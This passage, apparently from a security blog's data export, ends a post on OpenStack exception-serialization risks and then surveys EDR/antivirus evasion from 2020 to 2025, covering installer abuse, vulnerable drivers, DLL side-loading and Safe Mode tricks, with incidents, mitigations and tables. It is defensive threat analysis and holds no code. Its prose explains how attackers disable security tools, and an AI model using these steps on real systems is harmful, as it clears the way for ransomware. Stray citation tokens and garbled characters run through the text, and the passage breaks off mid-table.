bug)\nhttps://bugs.launchpad.net/bugs/1582207\nOpenStack Security Guidelines: Avoid Dangerous Input Parsing Libraries\nhttps://security.openstack.org/guidelines/dg_avoid-dangerous-input-parsing-libraries.html\nConclusion This analysis demonstrates that certain exception serialization and deserialization patterns could, in theory, result in code execution if all other safeguards fail. However, the exploitability is limited by real-world constraints and OpenStack\u0026rsquo;s layered defenses. The primary goal of this report is to help readers recognize and avoid insecure exception handling patterns, not to suggest that OpenStack is practically vulnerable to RCE via these mechanisms. Learning from these anti-patterns will help improve the security posture of distributed Python applications.\nFuture work should explore automated tooling to detect vulnerable flows and validate exploit feasibility in controlled OpenStack environments.\n","permalink":"https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/","summary":"Analysis of potential Remote Code Execution vulnerability in OpenStack Nova\u0026rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.","title":"Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned"},{"content":" Endpoint Security Evasion Techniques (2020‚Äì2025) ‚Äì A Technical Deep Dive Introduction and Key Trends (2020‚Äì2025) Over the past five years, threat actors have aggressively developed new techniques to bypass, disable, or blind endpoint detection and response (EDR) and antivirus tools. Rather than relying solely on malware obfuscation, attackers are increasingly exploiting design flaws in security products and operating system features to neutralize defenses. In multiple high-profile cases between 2020 and 2025, ransomware gangs (e.g. Babuk, LockBit, BlackByte, AvosLocker) and APT actors (e.g. ToddyCat) leveraged tactics like installer abuse, vulnerable drivers, DLL hijacking, and service manipulation to undermine EDR/AV protectionsfile-4pcvlwhk3myukez4vihgenhalcyon.ai. These in-the-wild attacks demonstrate that simply running an EDR agent is not a panacea ‚Äì if adversaries can turn the security software‚Äôs own functionality against itself, they can freely deploy ransomware or steal data once defenses are down.\nKey points:\n‚ÄúBring Your Own Installer‚Äù (BYOI) Abuse ‚Äì Attackers found they could leverage legitimate security product installers/updaters to disable the product itself during an upgrade or reinstall processhalcyon.ai. For example, in an incident investigated in 2025, Babuk ransomware operators used SentinelOne‚Äôs own installer to bypass its tamper protection, leaving the endpoint unprotected for malware executionhalcyon.ai. This technique exploits a window of opportunity when the EDR agent intentionally stops itself to perform an updatehalcyon.ai.\n‚ÄúBring Your Own Vulnerable Driver‚Äù (BYOVD) Attacks ‚Äì The use of legitimate but vulnerable drivers has become a widespread EDR-killer tactichalcyon.ai. Ransomware groups developed or adopted tools that load old, signed drivers with known flaws to gain kernel-level privileges and terminate security processeshalcyon.aihalcyon.ai. This method was observed across numerous Ransomware-as-a-Service (RaaS) operations (LockBit, BlackByte, Play, Medusa, BianLian, etc.), indicating significant investment in custom ‚ÄúEDR killer‚Äù malwarehalcyon.ainews.sophos.com.\nDLL Hijacking \u0026amp; Side-Loading ‚Äì Advanced attackers targeted insecure DLL loading paths or abused trusted binaries to inject malicious code and neutralize security tools. In a notable 2024 case, the ToddyCat APT exploited a DLL load vulnerability in ESET‚Äôs command-line scanner to load a malicious module inside the AV process, disabling its monitoring capabilitiessecurelist.comsecurelist.com. Similarly, LockBit affiliates abused Windows Defender‚Äôs CLI (MpCmdRun.exe) to side-load a fake DLL and run Cobalt Strike payloads, bypassing normal EDR detectionsentinelone.com.\nService Abuse \u0026amp; Anti-Tampering Gaps ‚Äì Attackers also abused OS features and weaknesses in security service protections. Ransomware like Snatch and AvosLocker rebooted systems into Safe Mode (where most security software is inactive) to evade endpoint protectionnews.sophos.comattackiq.com. In 2023, researchers even discovered a logic flaw in CrowdStrike Falcon that allowed an attacker with sufficient privileges to suspend the EDR‚Äôs core processes, effectively disabling protectionfile-4pcvlwhk3myukez4vihgen. These examples underscore how built-in maintenance or fail-safe modes can be manipulated to turn off security controls.\nIn the sections below, we dive into each category of evasion technique ‚Äì BYOI, BYOVD, DLL Hijacking, and Service Abuse ‚Äì explaining their technical mechanics, real-world cases, affected vendors, and countermeasures. We then provide comparative tables (techniques vs. vendors, timeline of emergence, and mitigations) and conclude with strategic recommendations for defenders to harden their endpoint security configurations.\nBring Your Own Installer (BYOI) ‚Äì Abusing Installers to Disable EDR ‚ÄúBring Your Own Installer‚Äù refers to leveraging a security product‚Äôs own installation or upgrade process to disable it. Modern EDR/AV agents have self-protection: they cannot be easily killed or uninstalled without special authorization. However, during a legitimate upgrade or reinstall, the agent intentionally stops or removes the old service before installing an updated version. Attackers discovered that by manually initiating an install/upgrade and then interrupting it, they could halt the EDR service indefinitely without needing any uninstall password or exploithalcyon.aihalcyon.ai.\nTechnical mechanics ‚Äì In practice, the attacker must have already gained privileged (Administrator) access on the endpoint. They then run the official EDR installer/updater (often an MSI or setup executable) for the same or a slightly older agent version. The installer will shut down the running EDR agent and service as a first step (assuming an upgrade is about to happen)halcyon.ai. At this point, protections are offline. The attacker then kills or aborts the installer process (e.g. msiexec.exe) at the critical moment, preventing the new agent from finishing installationhalcyon.ai. The result: the old agent is gone or inactive, and no new agent is running ‚Äì the endpoint is left unprotected and ‚Äúblind‚Äù in the EDR consolehalcyon.ai. This is essentially a race condition, exploiting the EDR‚Äôs own update logic rather than any code vulnerability.\nReal-world example ‚Äì In early 2025, an incident response team at Aon‚Äôs Stroz Friedberg encountered this BYOI technique during a ransomware investigationbleepingcomputer.com. The attackers (affiliates of the Babuk ransomware group) had compromised a publicly exposed server and escalated to local admin. They executed the legitimate SentinelOne Windows installer on the host and then forcibly terminated the installation process mid-wayhalcyon.ai. Logs showed that the SentinelOne agent was stopped and never restarted, causing the endpoint to appear ‚Äúoffline‚Äù in the management consolehalcyon.ai. The attackers proceeded to deploy Babuk ransomware on the unprotected machine, which encrypted data without any EDR interferencehalcyon.ai. This BYOI bypass was confirmed to work across multiple versions of the SentinelOne agent and did not require any third-party toolkit or malicious driver, making it stealthy and attractive to the attackersbleepingcomputer.combleepingcomputer.com.\nVendor response ‚Äì SentinelOne quickly responded by advising customers to enable an optional feature called ‚ÄúOnline (Local) Authorization‚Äù for agent upgradeshalcyon.ai. This setting (disabled by default in many environments) forces any local upgrade/uninstall to be authorized through the cloud console, preventing unapproved installer runs. SentinelOne privately rolled out this guidance in January 2025 and even released a detection rule named ‚ÄúPotential BYOI Exploitation‚Äù to identify attempts at this techniquefile-c4uibyf1ko4p8manjxxfhbfile-c4uibyf1ko4p8manjxxfhb. Once the Local Upgrade Authorization was enabled, Stroz Friedberg confirmed the bypass could no longer succeedfile-c4uibyf1ko4p8manjxxfhb. This case prompted SentinelOne to share details with other EDR vendors, highlighting that any endpoint security product with a similar local install/update mechanism could be at risk if not properly securedhalcyon.ai. (Notably, Palo Alto‚Äôs Cortex XDR confirmed it was not affected by this exact flawhalcyon.ai, implying their agent‚Äôs upgrade process might differ or require cloud confirmation.)\nOther instances ‚Äì While the SentinelOne/Babuk case publicized the BYOI concept, researchers have noted that many EDR and AV solutions exhibit similar behavior during reinstall. For example, a security researcher demonstrated in 2025 that reinstalling products like Forcepoint One Endpoint would forcefully terminate their processes and leave them off if the install is aborted (an apparent design oversight)\n. This suggests BYOI is a broader class of weakness: ‚ÄúShould running an installer really disable security?‚Äù was a pointed question raised to vendors. The takeaway is that installers/updaters must be designed with robust checks ‚Äì e.g. requiring authentication, not allowing critical protection gaps ‚Äì otherwise attackers with admin access can simply ‚Äúreinstall to disable‚Äù virtually any security software.\nBring Your Own Vulnerable Driver (BYOVD) ‚Äì Kernel-Mode EDR Killers Bring Your Own Vulnerable Driver attacks involve weaponizing legitimate, signed drivers that contain known vulnerabilities in order to execute code in the Windows kernel and cripple security software. This technique has surged in popularity from 2020 onward, as attackers realized that running code in kernel context can bypass or terminate even ‚Äúprotected‚Äù EDR processesresearch.checkpoint.comresearch.checkpoint.com. By loading an outdated driver with a flaw (one that allows arbitrary kernel memory writes, process termination, or disabling of security mechanisms), malware can effectively disable or blind the EDR/AV without triggering its self-defense mechanisms ‚Äì the driver is trusted by the OS due to a valid signature.\nTechnical mechanics ‚Äì The attacker needs a vulnerable driver file (usually a .sys file from an older version of legitimate software) and the ability to load it on the victim machine. Often, they first drop the driver and a small loader service or use OS utilities (sc.exe) to install/start the driver. The vulnerable driver, once running with kernel privileges, is then exploited to perform malicious actions such as killing protected processes, removing kernel callbacks, or unloading security software driversasec.ahnlab.comsecurelist.com. Common targets are the processes of well-known EDR/antivirus services ‚Äì by terminating or suspending those processes via kernel-mode access, the attacker neutralizes endpoint protections. Because the driver is signed, Windows will not block it by default (unless security features like Driver Signature Enforcement and blocklists are in place). This is essentially a way to turn the operating system against the security tools: the OS trusts the signed driver, which then can do anything at the highest privilege level.\nReal-world cases ‚Äì BYOVD has been observed across a wide range of ransomware families and threat actors:\nIn 2022, the BlackByte ransomware gang was found exploiting a vulnerable MSI Afterburner driver (RTCore64.sys) to disable EDR productstechtarget.com. The driver (used for GPU overclocking) had a known flaw (CVE-2019-16098) that allowed arbitrary kernel memory modification. BlackByte leveraged it to target the kernel interfaces that EDR products rely on, effectively blinding security tools by attacking the OS protection mechanismstechtarget.com.\nAround the same time, AvosLocker ransomware (noted by FBI/CISA in 2022‚Äì2023) abused a legitimate Avast Anti-Rootkit driver (aswArPot.sys) to disable antivirus softwaretrendmicro.com. The AvosLocker variant loaded this old Avast driver (which is vulnerable) to terminate security processes and even scanned for Log4j-vulnerable systems after neutralizing defensestrendmicro.com. This was one of the first instances reported in the U.S. of ransomware using a third-party AV component for evasion.\nBy 2023, the use of custom or repurposed ‚ÄúEDR killer‚Äù tools became a standard tactic for many RaaS groups. Sophos X-Ops reported on a tool dubbed ‚ÄúAuKill‚Äù that appeared in at least three ransomware incidents in early 2023, used to sabotage the target‚Äôs EDR before deployment of payloadsnews.sophos.comnews.sophos.com. AuKill abuses an outdated driver from Microsoft‚Äôs Process Explorer utility (PROCEXP.SYS) ‚Äì an example of reusing a benign tool‚Äôs driver. In January and February 2023, attackers used AuKill to disable EDR and then executed Medusa Locker ransomware, and in another case just prior to a LockBit ransomware attacknews.sophos.com. Notably, this driver-based approach is the same as an open-source tool called Backstab that was published in mid-2021news.sophos.com, indicating that threat actors are actively borrowing from or contributing to public proof-of-concepts.\nA major campaign unveiled in 2024 involved a threat actor deploying an EDR killer tool at scale, later attributed to the nascent RansomHub ransomware gang. Checkpoint Research found that between mid-2024 and early 2025, over 2,500 variants of a vulnerable driver (the TrueSight anti-rootkit driver v2.0.2) were used in the wild to bypass EDR and facilitate malware installationresearch.checkpoint.comresearch.checkpoint.com. The attackers cleverly modified minor details in the driver file to generate unique hashes while keeping the signature valid, allowing them to evade hash-based detectionresearch.checkpoint.comresearch.checkpoint.com. They also chose a version of TrueSight that was old enough to not be included in Microsoft‚Äôs driver blocklist (exploiting a policy loophole for drivers signed before July 2015)research.checkpoint.com. The campaign had a global reach, with about 75% of victims in China and others across Asiaresearch.checkpoint.com, and often delivered a Gh0st RAT payload after disabling securityresearch.checkpoint.comresearch.checkpoint.com.\nESET‚Äôs investigation into RansomHub (and corroborated by others like Halcyon) revealed the custom EDRKillShifter tool behind this campaignhalcyon.ai. EDRKillShifter uses the BYOVD technique to exploit vulnerable drivers (as seen with TrueSight.sys) and was offered through RansomHub‚Äôs affiliate program as a turnkey EDR killerhalcyon.ai. Interestingly, by late 2024 this tool spilled over to other gangs: the same EDRKillShifter was observed in Play, BianLian, and Medusa ransomware attacks, suggesting either collaboration or shared affiliates among these groupshalcyon.ai. This cross-group adoption underscores how effective BYOVD tools have become ‚Äì even typically siloed ransomware operations are willing to share or buy the capability to ‚Äúknock out‚Äù a wide range of EDR productshalcyon.ai.\nImpact on vendors ‚Äì BYOVD attacks generally target whatever EDR/AV is present on the victim system. The vulnerable driver can be instructed to terminate processes or services by name, so a single tool can attempt to kill dozens of different security products. In the RansomHub EDRKillShifter case, researchers noted it could disable ‚Äúan enormous range of EDR tools‚Äù, from mainstream AV engines to top EDR suiteshalcyon.aihalcyon.ai. Once the kernel malware is active, it effectively bypasses user-mode protections like self-defense, process hooking, or code injection prevention ‚Äì even protected processes (PPL) can be terminated or manipulated via the exploit. In short, no vendor is immune if the specific vulnerable driver isn‚Äôt blocked: as one report put it, ‚ÄúThey can shut down your security tools ‚Äì even those fancy EDR systems you paid top dollar for‚Äùhalcyon.aihalcyon.ai. Vendors have had to react by maintaining blocklists of bad drivers and adding behavior detections for such attacks (discussed later in mitigations).\nMitigations by vendors ‚Äì To combat BYOVD, security vendors and OS providers are employing multiple strategies. Microsoft maintains a Windows Vulnerable Driver Blocklist (used in Windows Defender Application Control and via features like HVCI) to prevent known bad drivers from loading. After the TrueSight.sys campaign was revealed, Microsoft updated this blocklist in December 2024 to include all discovered variants of that driverresearch.checkpoint.com. EDR vendors like ESET classify tools used in these attacks as ‚Äúpotentially unsafe applications‚Äù and will detect or block vulnerable drivers being loadedfile-4pcvlwhk3myukez4vihgen. For instance, ESET‚Äôs rules can flag events such as a ‚ÄúLoaded Driver from Uncommon Location‚Äù or ‚ÄúLoaded Known Vulnerable Driver‚Äù, alerting defenders if malware tries to install an out-of-place driver on an endpointfile-4pcvlwhk3myukez4vihgen. The key for defenders is to ensure these protective features (e.g. driver blocklists, advanced memory/behavior monitoring) are enabled, as BYOVD remains one of the most potent EDR evasion techniques to date.\nDLL Hijacking and Side-Loading ‚Äì Subverting Trust to Inject Malicious Code Another class of EDR evasion involves DLL hijacking (a.k.a. DLL side-loading or proxying). In these attacks, adversaries take advantage of how applications load libraries, either by exploiting vulnerable search paths or by misusing a trusted signed binary to load a malicious DLL. The ultimate goal is to execute attacker code under the guise of a legitimate process, often with elevated privileges or within a security process itself, thereby evading detection or actively disrupting the security tool.\nMechanics ‚Äì Windows applications often load DLLs by searching through a sequence of directories. If an application does not securely specify the path or if it looks in its ‚Äúcurrent directory‚Äù first, an attacker can plant a malicious DLL with the same name in a directory that gets loaded instead of the real onesecurelist.com. This is classical DLL hijacking. Alternatively, some malware uses a signed, trusted binary (‚ÄúLOLBin‚Äù) that is known to load a particular DLL ‚Äì the attacker places their malicious DLL in the expected location so that when the signed EXE runs, it will inadvertently load the attacker‚Äôs code. The result is malicious code running inside a process that may be whitelisted or trusted by security controls.\nESET case ‚Äì ToddyCat‚Äôs DLL Proxying: A prime example of DLL hijacking to target an AV itself was uncovered in 2024 involving the ToddyCat APT (an espionage group). Kaspersky reported that ToddyCat found a vulnerability in ESET‚Äôs command-line scanner (ecls.exe) where the program insecurely tried to load version.dll from its working directory before the system pathsecurelist.com. The attackers dropped a malicious DLL (named version.dll) alongside the ESET scanner binary. When ESET‚Äôs tool was executed (likely by the attackers themselves or via some scheduled task), it loaded the malicious DLL instead of the legitimate Windows version.dllsecurelist.com. This gave the malware code (a payload dubbed ‚ÄúTCESB‚Äù) the same privileges and trust as the ESET scanner process. The TCESB DLL, once loaded in the context of ESET‚Äôs antivirus process, went on to modify kernel structures to disable security notifications ‚Äì for example, turning off callbacks that report process creation or module loading events to security softwaresecurelist.com. In essence, ToddyCat hijacked ESET‚Äôs own process to create a blind spot in which it could operate undetected. This was such a serious issue that it was assigned CVE-2024-11859, and ESET issued a patch in January 2025 to fix the DLL load behavior in their softwaresecurelist.com.\nLockBit case ‚Äì Living off the Land: Ransomware actors have also used side-loading with Windows‚Äô own security binaries. In mid-2022, SentinelOne researchers observed a LockBit affiliate abusing the Microsoft Defender command-line tool, MpCmdRun.exe](https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/#:~:text=In%20this%20post%2C%20we%20follow,and%20load%20Cobalt%20Strike%20payloads)[sentinelone.com. They paired this legitimate Defender executable with a fake DLL (MpClient.dll). When MpCmdRun.exe was run (explicitly by the attacker), it decrypts and loads the malicious DLL ‚Äì in this case, the DLL contained shellcode to inject a Cobalt Strike Beacon into memorysentinelone.comsentinelone.com. The beauty of this method for the attacker is that Defender‚Äôs own binary was used to execute malicious code, likely bypassing certain application control or heuristic checks, since a Microsoft-signed binary was performing the action. From the EDR‚Äôs point of view, it might look like Windows Defender‚Äôs service was doing some routine work, whereas in reality it had been hijacked to launch the attacker\u0026rsquo;s implantsentinelone.comsentinelone.com.\nOther instances ‚Äì DLL side-loading is a long-standing technique especially common among state-sponsored groups. While not all instances directly disable EDR, they help malware to blend into trusted processes. For example, other ransomware families have side-loaded rogue DLLs via tools like VMware utilities, Microsoft Sysinternals tools, or outdated software installers as a way to bypass behavior monitoringsentinelone.comsentinelone.com. The key distinction in the EDR bypass context is whether the side-loading is used to impair the security tool or simply to stealthily run malware. In the ESET/ToddyCat case, it was explicitly to impair ESET‚Äôs protection. In many other cases (LockBit‚Äôs included), side-loading is used more to evade detection (running code in a trusted host process) rather than to outright kill the EDR. However, both goals are related ‚Äì by running inside a trusted process, the malicious code can often avoid scrutiny or operate in an environment where the EDR‚Äôs hooks are ineffective, thereby effectively bypassing the endpoint defense.\nMitigations ‚Äì Preventing DLL hijacking requires both vendor action and defensive monitoring. Software vendors must ensure their applications don‚Äôt load insecure DLL paths (e.g., always load system DLLs from system directories or use safe functions). In the ToddyCat incident, ESET‚Äôs prompt patch closed the hole by changing how ecls.exe loads version.dllsecurelist.com. From the defender side, enabling features like Microsoft‚Äôs Attack Surface Reduction (ASR) rules can block or flag unusual side-loading (for instance, Microsoft Defender has rules to prevent unsigned DLLs from loading into sensitive processes). EDR solutions themselves can monitor for known side-loading patterns ‚Äì e.g., a signed tool loading an unexpected DLL from a temp folder. In practice, defenders should watch for legitimate processes being launched from abnormal directories or alongside unexpected DLL files, as this often indicates a side-load setup. In our LockBit example, seeing MpCmdRun.exe execute from an atypical path or spawning network connections could be a clue to a side-loading attacksentinelone.com.\nService Abuse \u0026amp; Tampering ‚Äì Abusing System Tools and Modes to Disable Protection This category encompasses a variety of tricks where attackers manipulate the operating system or the security software‚Äôs service control mechanisms to turn off or evade EDR/AV, without necessarily exploiting code vulnerabilities. Some of these techniques date back years but have evolved or re-emerged in recent attacks.\nSafe Mode (reboot abuse) ‚Äì Many endpoint agents do not run in Windows Safe Mode (a diagnostic mode where only basic drivers load). Ransomware groups have capitalized on this by force-rebooting infected machines into Safe Mode to perform malicious actions without the security software runningnews.sophos.com. The Snatch ransomware first popularized this approach around late 2019: it installed itself as a service with a command to reboot into Safe Mode, and added a registry ‚ÄúRun‚Äù key so that its process (the encryptor) would start in Safe Mode on bootnews.sophos.comnews.sophos.com. Once the system restarted in that minimal environment, Snatch began encryption of files while the anti-malware services were inactive, thereby bypassing protectionnews.sophos.com. This technique continued to appear in subsequent years ‚Äì for instance, in 2023 AvosLocker was observed using a similar Safe Mode encryption stepattackiq.com. By doing this, the attackers negate agent self-defense (since the agent never starts) and can even tamper with or remove security software files in Safe Mode. The only constraint is that the attackers must have sufficient privileges to configure the auto-reboot and service, which by the later stages of an attack they often do.\nAbusing OS tools (sc, net, etc.) ‚Äì With administrative access, an attacker can attempt direct tampering: for example, using the Service Control Manager (sc.exe) or net stop commands to stop security services, or modifying the Windows Registry to prevent services from starting. Most modern EDRs have self-protection to block such actions ‚Äì e.g., they require an uninstall password or detect if their service is being tampered with ‚Äì but these protections can sometimes be subverted. Some attackers use PowerShell scripts or WMI to try and disable security features (like turning off Microsoft Defender‚Äôs real-time monitoring via registry keys or the PowerShell Set-MpPreference cmdlets). In corporate environments, Microsoft Defender‚Äôs Tamper Protection (when enabled) will lock those settings, but not all organizations had this enabled by default in earlier years. Thus, we saw malware (and Cobalt Strike playbooks) that included steps to attempt Defender disabling. The success of these attempts varies, but the prevalence of such scripts shows that attackers probe for misconfigurations where protections might be turned off or weakened.\nExploiting agent vulnerabilities ‚Äì Occasionally, the security agents themselves have bugs that attackers can exploit to disable them. The CrowdStrike Falcon case in 2023 is an illustrative example. Although details were not fully public, it was described as a logical flaw that allowed the suspension of Falcon‚Äôs processesfile-4pcvlwhk3myukez4vihgen. This suggests that if an attacker issued certain commands or manipulated the agent in a specific way (after gaining privileges), they could pause or crash the Falcon sensor. CrowdStrike presumably patched this quicklyfile-4pcvlwhk3myukez4vihgen, but it highlights that even top-tier EDR platforms can have edge-case vulnerabilities that attackers will seize if disclosed. Another example is a 2022 vulnerability in Trend Micro Apex One that allowed local privilege escalation and could be leveraged to kill the product, though such cases are less common compared to the above techniques.\nLiving-off-the-land abuse ‚Äì Beyond Safe Mode, attackers use legitimate administrative tools or modes of the OS to evade security. One such trick is using ‚ÄúSystem Repair‚Äù or Recovery Environments. For instance, an attacker might boot the machine into a Windows Recovery Environment or use tools like MSConfig to set a minimal boot, then encrypt files when the EDR is not loaded. Some ransomware (e.g., Black Basta in 2022) reportedly used strategies involving booting in a minimal state to bypass controls (similar in spirit to Safe Mode). Attackers have also misused HyperVisor or VMs (RagnarLocker famously ran the ransomware inside a VirtualBox VM on the host in 2020 to evade host-based EDR). While that crosses into a different category (virtualization-based evasion), it shows the creativity in abusing system features to subvert security software.\nReal-world impact ‚Äì Service abuse techniques tend to be noisy (reboots, service stoppage commands, etc.), but when successful, they lead to complete defense bypass. In incidents where Safe Mode was used, organizations often found out only after the fact ‚Äì the endpoint would drop offline from the EDR console, then come back but with all data encrypted. The Snatch attacks prompted warnings in late 2019/2020 about this tacticnews.sophos.com, and by 2023 AvosLocker‚Äôs use reaffirmed that it was still effective against many vendorsattackiq.com. Essentially, any scenario where attackers can temporarily or permanently shut down the security agents is game over for that endpoint‚Äôs protection. It‚Äôs a stark reminder that anti-tampering features must be robust. If a product can be easily disabled via registry or service control by admin-level malware, then that malware will do exactly that (many post-exploitation kits will attempt it). The arms race here is between attacker knowledge of these ‚Äútricks‚Äù and vendor mitigations to prevent or detect them.\nMitigations ‚Äì Defenders can take several steps to mitigate service abuse strategies. Enabling EDR/AV tamper-protection features is critical ‚Äì for example, Microsoft Defender‚Äôs Tamper Protection (to block registry/service changes), or similar features in other EDRs that prevent unauthorized unloading. Some EDR products offer a ‚Äúpassword required to boot in Safe Mode‚Äù or the ability to send an alert if an endpoint goes into Safe Mode unexpectedly. Where available, these should be enabled. Also, monitoring for sudden stopping of security services or drivers can detect an attack in progress ‚Äì many EDR management consoles will flag if an agent stops communicating. From an IT policy perspective, restricting local administrator accounts and using credential tiering can make it harder for attackers to reach the point of attempting these actions. Ultimately, defenders should treat an unexpected security agent shutdown or a host going into Safe Mode as signs of potential compromise and respond immediately.\nThe following sections provide comparative summaries in table form, consolidating how these evasion techniques map to different vendors, the timeline of their emergence, and the mitigation approaches that can counter them.\nTechniques vs. Affected Vendors (2020‚Äì2025) The table below summarizes each evasion technique category with examples of security vendors or products that were affected or targeted. This illustrates that no vendor is completely immune ‚Äì the techniques are often broadly applicable unless specific safeguards are in place.\nEvasion Technique Affected Endpoint Security Vendors (Examples) BYOI ‚Äì Installer Abuse SentinelOne: Agent upgrade process exploited (Babuk ransomware, 2025)halcyon.aihalcyon.ai. (SentinelOne issued fix via ‚ÄúOnline Authorization‚Äù feature)halcyon.ai. Also Potentially: Other EDRs with local installers (e.g. researchers showed Forcepoint and others could be similarly bypassed by reinstall). This is a design issue that could affect any vendor not requiring auth for reinstalls. BYOVD ‚Äì Vulnerable Drivers Multiple Vendors: BYOVD tools terminate processes of all major EDR/AV vendors if present. For example, Sophos, CrowdStrike, SentinelOne, Carbon Black, Microsoft Defender, etc., have all been targeted by driver-based EDR ‚Äúkillers‚Äùhalcyon.aihalcyon.ai. BlackByte (2022): Bypassed EDRs by abusing MSI Afterburner‚Äôs driver (CVE-2019-16098)techtarget.com. RansomHub EDRKillShifter (2024): Used a vulnerable driver to kill dozens of EDR/AV processes (observed killing SentinelOne, Microsoft, Trend Micro, etc. among others)halcyon.aihalcyon.ai. LockBit/Medusa (2023): Used Process Explorer driver to disable EDR (affected whichever EDR was on victim, reported cases with different EDRs)news.sophos.com. DLL Hijacking / Side-Loading ESET: Vulnerability in ESET‚Äôs command-line scanner allowed DLL hijack (ToddyCat APT, 2024) ‚Äì malicious DLL loaded into ESET process to disable itsecurelist.com. Patched by ESET (CVE-2024-11859)securelist.com. Microsoft Defender: LockBit ransomware affiliate abused Defender‚Äôs MpCmdRun.exe to side-load a malicious DLL, enabling malware execution under a Microsoft-signed processsentinelone.com. Others: Many vendors‚Äô products (and other trusted software) have been used for DLL side-loading by attackers (e.g. TrendMicro, Kaspersky, Sophos ‚Äì via their updaters or ancillary tools, in various APT cases). The technique is not vendor-specific: it exploits how Windows loads DLLs and trusts signed binaries. Service Abuse \u0026amp; Tampering CrowdStrike: Falcon EDR agent vulnerability (disclosed 2023) allowed attackers to suspend/disable the sensor via a flaw in the service, undermining protectionfile-4pcvlwhk3myukez4vihgen. Patched by CrowdStrike upon discoveryfile-4pcvlwhk3myukez4vihgen. All EDRs (Safe Mode): Any EDR will be ineffective in Safe Mode unless specifically designed otherwise. Ransomware like Snatch (2020) and AvosLocker (2023) abused this by rebooting machines into Safe Mode to encrypt files while Sophos, Defender, etc., were inactivenews.sophos.comattackiq.com. This impacts all vendors who rely on normal mode drivers. Microsoft Defender: Attackers often attempt to use PowerShell or registry tweaks to turn off Defender‚Äôs real-time protection (if Tamper Protection is off). Without Tamper Protection, local admin malware can disable Defender via OS settings (seen in many malware playbooks 2020‚Äì2022). Microsoft‚Äôs Tamper Protection (on by default in enterprise since late 2019) mitigates this, but not all orgs had it enabled initially. Sophos EDR: Like others, if malware attains admin rights, it could try to unload or kill Sophos services. Sophos has strong self-defense, but incidents like ransomware ‚Äúkill lists‚Äù include Sophos processes to terminate. (No known public exploit, but e.g. LockBit‚Äôs built-in process killer lists SophosSAVService.exe, etc.) In general, service-stop attempts hit all major vendors; success depends on each product‚Äôs tamper protection strength. Timeline of Evasion Techniques Emergence (2020‚Äì2025) This timeline highlights when major evasion techniques or campaigns were first observed and how they evolved between 2020 and 2025:\nTimeframe Evasion Technique \u0026amp; Notable Incident Details and Impact Late 2019 ‚Äì 2020 Safe Mode Ransomware (Snatch) news.sophos.com Service Abuse Snatch ransomware reboots Windows into Safe Mode to encrypt files without EDR/AV runningnews.sophos.com. First seen Oct 2019, continued in 2020. Highlighted a design gap: most security tools do not load in Safe Mode, allowing malware free rein. Sophos reported this as a novel technique to bypass protectionnews.sophos.com, prompting industry awareness. 2021 Open-Source EDR Killer (Backstab) news.sophos.com BYOVD The Backstab tool was released (June 2021) demonstrating a BYOVD attack using Process Explorer‚Äôs drivernews.sophos.com. This marked one of the first publicly available EDR-killer PoCs, foreshadowing later ransomware adoption. Attackers begin experimenting with driver-based kills, though in 2021 it was mostly seen in testing/red-team contexts. 2022 (Q3) BlackByte‚Äôs BYOVD Attack techtarget.com BYOVD BlackByte ransomware operators deploy a signed vulnerable driver (MSI Afterburner‚Äôs RTCore64.sys) during intrusions to disable EDRtechtarget.com. (CVE-2019-16098 exploit). This is one of the first high-profile ransomware BYOVD cases (Oct 2022) and is publicized by Sophos and media. It showed that criminal groups had adopted BYOVD to target the kernel interfaces of EDR productstechtarget.com. 2022 (Q4) Ransomware EDR ‚ÄúKillers‚Äù Appear news.sophos.com BYOVD Multiple ransomware groups start using custom-built or stolen drivers to kill EDR/AV processes. In late 2022, Sophos, Microsoft, Mandiant, and others reported on attackers using malicious drivers (some with stolen certificates) to bypass securitynews.sophos.com. For example, a driver dubbed ‚ÄúPOORTRY‚Äù (detected in a BlackCat incident) and others were noted. This wave led to vendor collab with Microsoft to revoke certificates and update blocklists. 2022 (Jul) LockBit Sideloads Defender sentinelone.com DLL Side-Loading A LockBit 3.0 affiliate was observed using Windows Defender‚Äôs MpCmdRun.exe to side-load a malicious DLL and decrypt Cobalt Strike beaconsentinelone.com. (Incident reported July 2022). This innovative abuse of a security tool as a loader signaled that threat actors were exploring living-off-the-land within security processes. It didn‚Äôt disable EDR directly, but it evaded detection by using a trusted binary. 2023 (Jan‚ÄìFeb) AuKill in Ransomware Attacks news.sophos.com BYOVD The AuKill malware (BYOVD tool using an outdated Process Explorer driver) was used in at least three cases: deploying Medusa Locker and LockBit ransomware after disabling the EDR in early 2023news.sophos.com. This showed the commoditization of EDR-killers ‚Äì affiliates in different RaaS franchises obtaining the same tool. Sophos published details in April 2023, emphasizing rising driver-based attacksnews.sophos.com. 2023 (Mid) CrowdStrike Falcon Vulnerability file-4pcvlwhk3myukez4vihgen Service Flaw A vulnerability in CrowdStrike Falcon (disclosed mid-2023) allowed attackers with admin access to suspend or disrupt the Falcon sensor processfile-4pcvlwhk3myukez4vihgen. Although details were scarce (likely a bug rather than an intended design), it underscored that even leading EDRs had to patch logic flaws to maintain self-protection. CrowdStrike released fixes; no widespread abuse by malware was reported publicly, but POCs might have existed. 2023 (Late) Safe Mode Redux (AvosLocker) attackiq.com Service Abuse FBI/CISA advisories in 2023 noted AvosLocker ransomware using the Safe Mode trick to disable securityattackiq.com. This confirmed that newer ransomware strains were adopting the tactic pioneered by Snatch. By now, multiple families (Snatch, BlackBasta, AvosLocker) have used some variation of rebooting to bypass EDR, indicating it remained a viable evasion method. 2024 (Mid) RansomHub‚Äôs EDRKillShifter Launch halcyon.ai BYOVD The RansomHub gang introduced their custom EDR killer EDRKillShifter around May 2024welivesecurity.comwelivesecurity.com. Throughout 2024, this tool was proliferating in attacks, and by August 2024 it was firmly associated with RansomHub operationshalcyon.ai. Within weeks, affiliates began using it in other ransomware (Play, BianLian, etc.), indicating cross-pollinationhalcyon.ai. This period marked the peak of BYOVD tool usage in ransomware campaigns, with thousands of driver variants in playresearch.checkpoint.com. 2024 (Late) ToddyCat ESET DLL Hijack securelist.com DLL Hijacking In late 2024, Kaspersky discovered ToddyCat APT using a DLL hijack in ESET software to stealthily disable its protectionssecurelist.com. ESET‚Äôs patch and advisory came out in Jan 2025securelist.com. This was a rare instance of APT-style evasion hitting a security vendor directly via vulnerability. It highlighted the need for vendors to audit their loading mechanisms. 2025 (Q1) SentinelOne BYOI (Babuk) bleepingcomputer.comhalcyon.ai BYOI The 